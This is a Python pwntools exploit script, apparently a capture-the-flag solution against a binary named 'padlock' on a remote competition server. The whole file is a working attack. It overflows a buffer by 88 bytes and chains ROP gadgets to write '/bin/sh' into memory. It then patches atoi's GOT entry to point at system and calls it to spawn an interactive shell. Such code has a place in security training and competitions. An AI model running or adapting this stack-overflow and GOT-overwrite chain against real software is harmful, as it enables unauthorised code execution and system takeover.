#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./padlock', checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) 
libc = ELF('./libc.so.6', checksec=False)  # Use the provided libc for accurate offsets

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13597)

OFFSET_TO_RIP = 88

# Gadgets
pop_rdi   = elf.symbols['pop_rdi_ret']
pop_rsi   = elf.symbols['pop_rsi_ret']
add_gadget = elf.symbols['add_what_where']
ret_gadget = elf.symbols['ret_gadget']  # For stack alignment

vault_addr = elf.symbols['vault']
atoi_got = elf.got['atoi']
atoi_plt = elf.plt['atoi']

# 1. Calculate the GOT overwrite value 
difference = libc.symbols['system'] - libc.symbols['atoi']
#system_offset_u64 = difference & 0xffffffffffffffff

# 2. Convert "/bin/sh\x00" into a 64-bit integer
binsh_int = u64(b'/bin/sh\x00')

# 3. Build the single-pass ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    # --- PHASE 1: Write "/bin/sh\x00" into vault ---
    p64(pop_rdi), p64(vault_addr),
    p64(pop_rsi), p64(binsh_int),
    p64(add_gadget),               

    # --- PHASE 2: Overwrite atoi GOT with system ---
    p64(pop_rdi), p64(atoi_got),
    p64(pop_rsi), p64(difference),
    p64(add_gadget),               

    # --- PHASE 3: Call system("/bin/sh") ---
    p64(pop_rdi), p64(vault_addr), 
    p64(atoi_plt)                  
)

p.recvuntil(b'combination: ')

p.send(payload)           

p.interactive()